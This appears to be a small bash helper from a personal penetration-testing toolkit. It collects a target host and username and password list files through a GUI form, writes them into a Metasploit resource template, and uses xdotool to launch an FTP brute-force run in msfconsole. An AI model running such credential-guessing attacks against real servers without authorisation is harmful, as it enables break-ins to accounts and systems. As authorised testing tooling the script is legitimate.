#!/bin/bash

: '
hydra: bruteforce username file and passwords file
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh
source ~/Desktop/base/code/xdotool/helpers/find_and_replace_in_file.sh

# Generate gui form
generate_form "RHOSTS" "USER_FILE" "PASS_FILE"

RHOSTS=${form_data["RHOSTS"]}
USER_FILE=${form_data["USER_FILE"]}
PASS_FILE=${form_data["PASS_FILE"]}

FILES_FOLDER="$HOME/Desktop/base/code/xdotool/scripts/ftp/.files"

SRC_FILE="${FILES_FOLDER}/ftp_brute_force_userfile_passfile.rc"
TMP_FILE="${FILES_FOLDER}/ftp_brute_force_userfile_passfile_tmp.rc"

ls ${FILES_FOLDER}

replace_in_file "${SRC_FILE}" "${TMP_FILE}" "[USER_FILE]"  "${USER_FILE}"  "[PASS_FILE]"  "${PASS_FILE}"  "[RHOSTS]"  "${RHOSTS}" 

paste_command "msfconsole -r ${TMP_FILE}"
xdotool key Return

sleep 30
rm $TMP_FILE